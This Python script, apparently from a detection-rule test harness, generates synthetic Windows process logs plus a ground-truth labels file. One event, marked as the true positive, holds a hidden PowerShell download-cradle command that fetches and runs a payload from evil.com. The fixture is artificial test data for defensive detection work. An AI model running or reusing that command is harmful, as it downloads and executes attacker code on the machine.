# datagen/generate_logs.py
import json
import csv
import uuid

def generate_logs():
    """Generates a log file (events.jsonl) and a ground truth labels file (labels.csv)."""

    # --- Define Log Events ---

    # Event 1: A malicious PowerShell command. This is our TRUE POSITIVE.
    true_positive_event = {
        "event_id": str(uuid.uuid4()),
        "timestamp": "2025-10-17T12:00:00Z",
        "logsource": {"product": "windows", "category": "process_creation"},
        "process": {
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString(\'http://evil.com/payload\')\""
        }
    }

    # Event 2: A benign Chrome process. This is a TRUE NEGATIVE.
    true_negative_1 = {
        "event_id": str(uuid.uuid4()),
        "timestamp": "2025-10-17T12:01:00Z",
        "logsource": {"product": "windows", "category": "process_creation"},
        "process": {
            "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
            "CommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --flag-switches-begin"
        }
    }

    # Event 3: A benign svchost process. Also a TRUE NEGATIVE.
    true_negative_2 = {
        "event_id": str(uuid.uuid4()),
        "timestamp": "2025-10-17T12:02:00Z",
        "logsource": {"product": "windows", "category": "process_creation"},
        "process": {
            "Image": "C:\\Windows\\system32\\svchost.exe",
            "CommandLine": "svchost.exe -k netsvcs -p -s BITS"
        }
    }

    events = [true_positive_event, true_negative_1, true_negative_2]

    # --- Write Files ---

    # Write the log file (one JSON object per line)
    with open("events.jsonl", "w") as f:
        for event in events:
            f.write(json.dumps(event) + "\n")

    # Write the ground truth labels file
    with open("labels.csv", "w", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["event_id", "expected_match_rule_id"])
        # The first event is expected to match our specific rule ID
        writer.writerow([true_positive_event["event_id"], "5a8a4f8a-9b9b-4e8e-9a9a-9a9a9a9a9a9a"])
        # The other events are not expected to match anything
        writer.writerow([true_negative_1["event_id"], "none"])
        writer.writerow([true_negative_2["event_id"], "none"])

    print("[*] Successfully generated 'events.jsonl' and 'labels.csv'")

if __name__ == "__main__":
    generate_logs()
